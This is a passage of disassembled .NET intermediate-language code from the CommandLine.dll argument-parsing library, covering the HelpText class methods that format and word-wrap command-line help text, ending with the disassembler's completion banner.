    IL_01b9:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_01be:  pop
    IL_01bf:  ldloc.2
    IL_01c0:  ldc.i4.1
    IL_01c1:  add
    IL_01c2:  stloc.2
    IL_01c3:  br         IL_0208

    IL_01c8:  ldloc.s    V_4
    IL_01ca:  ldloc.s    V_5
    IL_01cc:  ldelem     [mscorlib]System.String
    IL_01d1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_01d6:  ldarg.s    widthOfHelpText
    IL_01d8:  blt        IL_0219

    IL_01dd:  ldloc.2
    IL_01de:  brtrue     IL_0219

    IL_01e3:  ldarg.0
    IL_01e4:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_01e9:  ldloc.s    V_4
    IL_01eb:  ldloc.s    V_5
    IL_01ed:  ldelem     [mscorlib]System.String
    IL_01f2:  ldc.i4.0
    IL_01f3:  ldarg.s    widthOfHelpText
    IL_01f5:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_01fa:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_01ff:  pop
    IL_0200:  ldarg.s    widthOfHelpText
    IL_0202:  stloc.2
    IL_0203:  br         IL_0219

    IL_0208:  ldloc.s    V_5
    IL_020a:  ldc.i4.1
    IL_020b:  add
    IL_020c:  stloc.s    V_5
    IL_020e:  ldloc.s    V_5
    IL_0210:  ldloc.s    V_4
    IL_0212:  ldlen
    IL_0213:  conv.i4
    IL_0214:  blt        IL_015a

    IL_0219:  ldarg.3
    IL_021a:  ldarg.3
    IL_021b:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_0220:  ldloc.2
    IL_0221:  ldarg.3
    IL_0222:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_0227:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_022c:  call       int32 [mscorlib]System.Math::Min(int32,
                                                          int32)
    IL_0231:  callvirt   instance string [mscorlib]System.String::Substring(int32)
    IL_0236:  callvirt   instance string [mscorlib]System.String::Trim()
    IL_023b:  callvirt   instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
    IL_0240:  ldarg.3
    IL_0241:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_0246:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_024b:  ldc.i4.0
    IL_024c:  ble        IL_0278

    IL_0251:  ldarg.0
    IL_0252:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0257:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_025c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0261:  pop
    IL_0262:  ldarg.0
    IL_0263:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0268:  ldc.i4.s   32
    IL_026a:  ldarg.2
    IL_026b:  ldc.i4.6
    IL_026c:  add
    IL_026d:  newobj     instance void [mscorlib]System.String::.ctor(char,
                                                                      int32)
    IL_0272:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0277:  pop
    IL_0278:  ldarg.3
    IL_0279:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_027e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0283:  ldarg.s    widthOfHelpText
    IL_0285:  bgt        IL_0136

    IL_028a:  ldarg.0
    IL_028b:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0290:  ldarg.3
    IL_0291:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_0296:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_029b:  pop
    IL_029c:  ldarg.0
    IL_029d:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_02a2:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_02a7:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_02ac:  pop
    IL_02ad:  ldarg.0
    IL_02ae:  ldfld      bool CommandLine.Text.HelpText::_additionalNewLineAfterOption
    IL_02b3:  brfalse    IL_02c9

    IL_02b8:  ldarg.0
    IL_02b9:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_02be:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_02c3:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_02c8:  pop
    IL_02c9:  ret
  } // end of method HelpText::AddOption

  .method public hidebysig virtual instance string 
          ToString() cil managed
  {
    // Code size       281 (0x119)
    .maxstack  22
    .locals init ([0] class [mscorlib]System.Text.StringBuilder V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.Text.HelpText::_heading
    IL_0006:  call       int32 CommandLine.Text.HelpText::GetLength(string)
    IL_000b:  ldarg.0
    IL_000c:  ldfld      string CommandLine.Text.HelpText::_copyright
    IL_0011:  call       int32 CommandLine.Text.HelpText::GetLength(string)
    IL_0016:  add
    IL_0017:  ldarg.0
    IL_0018:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_preOptionsHelp
    IL_001d:  call       int32 CommandLine.Text.HelpText::GetLength(class [mscorlib]System.Text.StringBuilder)
    IL_0022:  add
    IL_0023:  ldarg.0
    IL_0024:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0029:  call       int32 CommandLine.Text.HelpText::GetLength(class [mscorlib]System.Text.StringBuilder)
    IL_002e:  add
    IL_002f:  ldc.i4.s   10
    IL_0031:  add
    IL_0032:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0037:  stloc.0
    IL_0038:  ldloc.0
    IL_0039:  ldarg.0
    IL_003a:  ldfld      string CommandLine.Text.HelpText::_heading
    IL_003f:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0044:  pop
    IL_0045:  ldarg.0
    IL_0046:  ldfld      string CommandLine.Text.HelpText::_copyright
    IL_004b:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0050:  brtrue     IL_006e

    IL_0055:  ldloc.0
    IL_0056:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_005b:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0060:  pop
    IL_0061:  ldloc.0
    IL_0062:  ldarg.0
    IL_0063:  ldfld      string CommandLine.Text.HelpText::_copyright
    IL_0068:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_006d:  pop
    IL_006e:  ldarg.0
    IL_006f:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_preOptionsHelp
    IL_0074:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_0079:  ldc.i4.0
    IL_007a:  ble        IL_009d

    IL_007f:  ldloc.0
    IL_0080:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_0085:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_008a:  pop
    IL_008b:  ldloc.0
    IL_008c:  ldarg.0
    IL_008d:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_preOptionsHelp
    IL_0092:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0097:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_009c:  pop
    IL_009d:  ldarg.0
    IL_009e:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00a3:  brfalse    IL_00e3

    IL_00a8:  ldarg.0
    IL_00a9:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00ae:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_00b3:  ldc.i4.0
    IL_00b4:  ble        IL_00e3

    IL_00b9:  ldloc.0
    IL_00ba:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00bf:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00c4:  pop
    IL_00c5:  ldloc.0
    IL_00c6:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00cb:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00d0:  pop
    IL_00d1:  ldloc.0
    IL_00d2:  ldarg.0
    IL_00d3:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00d8:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_00dd:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00e2:  pop
    IL_00e3:  ldarg.0
    IL_00e4:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_postOptionsHelp
    IL_00e9:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_00ee:  ldc.i4.0
    IL_00ef:  ble        IL_0112

    IL_00f4:  ldloc.0
    IL_00f5:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00fa:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00ff:  pop
    IL_0100:  ldloc.0
    IL_0101:  ldarg.0
    IL_0102:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_postOptionsHelp
    IL_0107:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_010c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0111:  pop
    IL_0112:  ldloc.0
    IL_0113:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0118:  ret
  } // end of method HelpText::ToString

  .method public hidebysig specialname static 
          string  op_Implicit(class CommandLine.Text.HelpText info) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0006:  ret
  } // end of method HelpText::op_Implicit

  .method private hidebysig instance void 
          AddLine(class [mscorlib]System.Text.StringBuilder builder,
                  string 'value') cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.2
    IL_0001:  ldstr      "value"
    IL_0006:  call       void CommandLine.Assumes::NotNull<string>(!!0,
                                                                   string)
    IL_000b:  ldarg.1
    IL_000c:  ldarg.2
    IL_000d:  ldarg.0
    IL_000e:  call       instance int32 CommandLine.Text.HelpText::get_MaximumDisplayWidth()
    IL_0013:  call       void CommandLine.Text.HelpText::AddLine(class [mscorlib]System.Text.StringBuilder,
                                                                 string,
                                                                 int32)
    IL_0018:  ret
  } // end of method HelpText::AddLine

  .method private hidebysig static void  AddLine(class [mscorlib]System.Text.StringBuilder builder,
                                                 string 'value',
                                                 int32 maximumLength) cil managed
  {
    // Code size       284 (0x11c)
    .maxstack  21
    .locals init ([0] int32 V_0,
             [1] char[] V_1,
             [2] string[] V_2,
             [3] int32 V_3)
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "value"
    IL_0006:  call       void CommandLine.Assumes::NotNull<string>(!!0,
                                                                   string)
    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_0011:  ldc.i4.0
    IL_0012:  ble        IL_0023

    IL_0017:  ldarg.0
    IL_0018:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_001d:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0022:  pop
    IL_0023:  ldc.i4.0
    IL_0024:  stloc.0
    IL_0025:  ldarg.1
    IL_0026:  ldc.i4.1
    IL_0027:  newarr     [mscorlib]System.Char
    IL_002c:  stloc.1
    IL_002d:  ldloc.1
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.s   32
    IL_0031:  stelem.i2
    IL_0032:  ldloc.1
    IL_0033:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0038:  stloc.2
    IL_0039:  ldc.i4.0
    IL_003a:  stloc.3
    IL_003b:  br         IL_00d2

    IL_0040:  ldloc.2
    IL_0041:  ldloc.3
    IL_0042:  ldelem     [mscorlib]System.String
    IL_0047:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_004c:  ldarg.2
    IL_004d:  ldloc.0
    IL_004e:  sub
    IL_004f:  bge        IL_009a

    IL_0054:  ldarg.0
    IL_0055:  ldloc.2
    IL_0056:  ldloc.3
    IL_0057:  ldelem     [mscorlib]System.String
    IL_005c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0061:  pop
    IL_0062:  ldloc.0
    IL_0063:  ldloc.2
    IL_0064:  ldloc.3
    IL_0065:  ldelem     [mscorlib]System.String
    IL_006a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_006f:  add
    IL_0070:  stloc.0
    IL_0071:  ldarg.2
    IL_0072:  ldloc.0
    IL_0073:  sub
    IL_0074:  ldc.i4.1
    IL_0075:  ble        IL_00ce

    IL_007a:  ldloc.3
    IL_007b:  ldloc.2
    IL_007c:  ldlen
    IL_007d:  conv.i4
    IL_007e:  ldc.i4.1
    IL_007f:  sub
    IL_0080:  beq        IL_00ce

    IL_0085:  ldarg.0
    IL_0086:  ldstr      " "
    IL_008b:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0090:  pop
    IL_0091:  ldloc.0
    IL_0092:  ldc.i4.1
    IL_0093:  add
    IL_0094:  stloc.0
    IL_0095:  br         IL_00ce

    IL_009a:  ldloc.2
    IL_009b:  ldloc.3
    IL_009c:  ldelem     [mscorlib]System.String
    IL_00a1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_00a6:  ldarg.2
    IL_00a7:  blt        IL_00db

    IL_00ac:  ldloc.0
    IL_00ad:  brtrue     IL_00db

    IL_00b2:  ldarg.0
    IL_00b3:  ldloc.2
    IL_00b4:  ldloc.3
    IL_00b5:  ldelem     [mscorlib]System.String
    IL_00ba:  ldc.i4.0
    IL_00bb:  ldarg.2
    IL_00bc:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_00c1:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00c6:  pop
    IL_00c7:  ldarg.2
    IL_00c8:  stloc.0
    IL_00c9:  br         IL_00db

    IL_00ce:  ldloc.3
    IL_00cf:  ldc.i4.1
    IL_00d0:  add
    IL_00d1:  stloc.3
    IL_00d2:  ldloc.3
    IL_00d3:  ldloc.2
    IL_00d4:  ldlen
    IL_00d5:  conv.i4
    IL_00d6:  blt        IL_0040

    IL_00db:  ldarg.1
    IL_00dc:  ldloc.0
    IL_00dd:  ldarg.1
    IL_00de:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_00e3:  call       int32 [mscorlib]System.Math::Min(int32,
                                                          int32)
    IL_00e8:  callvirt   instance string [mscorlib]System.String::Substring(int32)
    IL_00ed:  starg.s    'value'
    IL_00ef:  ldarg.1
    IL_00f0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_00f5:  ldc.i4.0
    IL_00f6:  ble        IL_0107

    IL_00fb:  ldarg.0
    IL_00fc:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_0101:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0106:  pop
    IL_0107:  ldarg.1
    IL_0108:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_010d:  ldarg.2
    IL_010e:  bgt        IL_0023

    IL_0113:  ldarg.0
    IL_0114:  ldarg.1
    IL_0115:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_011a:  pop
    IL_011b:  ret
  } // end of method HelpText::AddLine

  .method private hidebysig static int32 
          GetLength(string 'value') cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  brtrue     IL_0008

    IL_0006:  ldc.i4.0
    IL_0007:  ret

    IL_0008:  ldarg.0
    IL_0009:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_000e:  ret
  } // end of method HelpText::GetLength

  .method private hidebysig static int32 
          GetLength(class [mscorlib]System.Text.StringBuilder 'value') cil managed
  {
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  brtrue     IL_0008

    IL_0006:  ldc.i4.0
    IL_0007:  ret

    IL_0008:  ldarg.0
    IL_0009:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_000e:  ret
  } // end of method HelpText::GetLength

  .method private hidebysig instance int32 
          GetMaxLength(class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.BaseOptionAttribute> optionList) cil managed
  {
    // Code size       168 (0xa8)
    .maxstack  16
    .locals init ([0] int32 V_0,
             [1] class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.BaseOptionAttribute> V_1,
             [2] class CommandLine.BaseOptionAttribute V_2,
             [3] int32 V_3,
             [4] bool V_4,
             [5] bool V_5)
    IL_0000:  ldc.i4.0
    IL_0001:  stloc.0
    IL_0002:  ldarg.1
    IL_0003:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.Generic.IEnumerable`1<class CommandLine.BaseOptionAttribute>::GetEnumerator()
    IL_0008:  stloc.1
    .try
    {
      IL_0009:  br         IL_0089

      IL_000e:  ldloc.1
      IL_000f:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.BaseOptionAttribute>::get_Current()
      IL_0014:  stloc.2
      IL_0015:  ldc.i4.0
      IL_0016:  stloc.3
      IL_0017:  ldloc.2
      IL_0018:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasShortName()
      IL_001d:  stloc.s    V_4
      IL_001f:  ldloc.2
      IL_0020:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasLongName()
      IL_0025:  stloc.s    V_5
      IL_0027:  ldloc.s    V_4
      IL_0029:  brfalse    IL_004b

      IL_002e:  ldloc.3
      IL_002f:  ldloc.2
      IL_0030:  callvirt   instance string CommandLine.BaseOptionAttribute::get_ShortName()
      IL_0035:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_003a:  add
      IL_003b:  stloc.3
      IL_003c:  ldarg.0
      IL_003d:  call       instance bool CommandLine.Text.HelpText::get_AddDashesToOption()
      IL_0042:  brfalse    IL_004b

      IL_0047:  ldloc.3
      IL_0048:  ldc.i4.1
      IL_0049:  add
      IL_004a:  stloc.3
      IL_004b:  ldloc.s    V_5
      IL_004d:  brfalse    IL_006f

      IL_0052:  ldloc.3
      IL_0053:  ldloc.2
      IL_0054:  callvirt   instance string CommandLine.BaseOptionAttribute::get_LongName()
      IL_0059:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005e:  add
      IL_005f:  stloc.3
      IL_0060:  ldarg.0
      IL_0061:  call       instance bool CommandLine.Text.HelpText::get_AddDashesToOption()
      IL_0066:  brfalse    IL_006f

      IL_006b:  ldloc.3
      IL_006c:  ldc.i4.2
      IL_006d:  add
      IL_006e:  stloc.3
      IL_006f:  ldloc.s    V_4
      IL_0071:  brfalse    IL_0081

      IL_0076:  ldloc.s    V_5
      IL_0078:  brfalse    IL_0081

      IL_007d:  ldloc.3
      IL_007e:  ldc.i4.2
      IL_007f:  add
      IL_0080:  stloc.3
      IL_0081:  ldloc.0
      IL_0082:  ldloc.3
      IL_0083:  call       int32 [mscorlib]System.Math::Max(int32,
                                                            int32)
      IL_0088:  stloc.0
      IL_0089:  ldloc.1
      IL_008a:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_008f:  brtrue     IL_000e

      IL_0094:  leave      IL_00a6

    }  // end .try
    finally
    {
      IL_0099:  ldloc.1
      IL_009a:  brfalse    IL_00a5

      IL_009f:  ldloc.1
      IL_00a0:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00a5:  endfinally
    }  // end handler
    IL_00a6:  ldloc.0
    IL_00a7:  ret
  } // end of method HelpText::GetMaxLength

  .method family hidebysig newslot virtual 
          instance void  OnFormatOptionHelpText(class CommandLine.Text.FormatOptionHelpTextEventArgs e) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  4
    .locals init ([0] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> CommandLine.Text.HelpText::FormatOptionHelpText
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brfalse    IL_0015

    IL_000d:  ldloc.0
    IL_000e:  ldarg.0
    IL_000f:  ldarg.1
    IL_0010:  callvirt   instance void class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>::Invoke(object,
                                                                                                                                           !0)
    IL_0015:  ret
  } // end of method HelpText::OnFormatOptionHelpText

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldstr      "Required."
    IL_0005:  stsfld     string CommandLine.Text.HelpText::_defaultRequiredWord
    IL_000a:  ret
  } // end of method HelpText::.cctor

  .event class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> FormatOptionHelpText
  {
    .addon instance void CommandLine.Text.HelpText::add_FormatOptionHelpText(class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>)
    .removeon instance void CommandLine.Text.HelpText::remove_FormatOptionHelpText(class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>)
  } // end of event HelpText::FormatOptionHelpText
  .property instance string Heading()
  {
    .set instance void CommandLine.Text.HelpText::set_Heading(string)
  } // end of property HelpText::Heading
  .property instance string Copyright()
  {
    .set instance void CommandLine.Text.HelpText::set_Copyright(string)
  } // end of property HelpText::Copyright
  .property instance int32 MaximumDisplayWidth()
  {
    .get instance int32 CommandLine.Text.HelpText::get_MaximumDisplayWidth()
    .set instance void CommandLine.Text.HelpText::set_MaximumDisplayWidth(int32)
  } // end of property HelpText::MaximumDisplayWidth
  .property instance bool AddDashesToOption()
  {
    .get instance bool CommandLine.Text.HelpText::get_AddDashesToOption()
    .set instance void CommandLine.Text.HelpText::set_AddDashesToOption(bool)
  } // end of property HelpText::AddDashesToOption
  .property instance bool AdditionalNewLineAfterOption()
  {
    .get instance bool CommandLine.Text.HelpText::get_AdditionalNewLineAfterOption()
    .set instance void CommandLine.Text.HelpText::set_AdditionalNewLineAfterOption(bool)
  } // end of property HelpText::AdditionalNewLineAfterOption
  .property instance class CommandLine.Text.BaseSentenceBuilder
          SentenceBuilder()
  {
    .get instance class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::get_SentenceBuilder()
  } // end of property HelpText::SentenceBuilder
} // end of class CommandLine.Text.HelpText

.class private abstract auto ansi sealed beforefieldinit ThisAssembly
       extends [mscorlib]System.Object
{
  .field static assembly literal string Title = "CommandLine.dll"
  .field static assembly literal string Copyright = "Copyright (C) 2005 - 2012 Giacomo Stelluti Scala"
  .field static assembly literal string Version = "1.9.3.15"
  .field static assembly literal string InformationalVersion = "1.9.3.15"
} // end of class ThisAssembly


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file TestUnmanaged.res
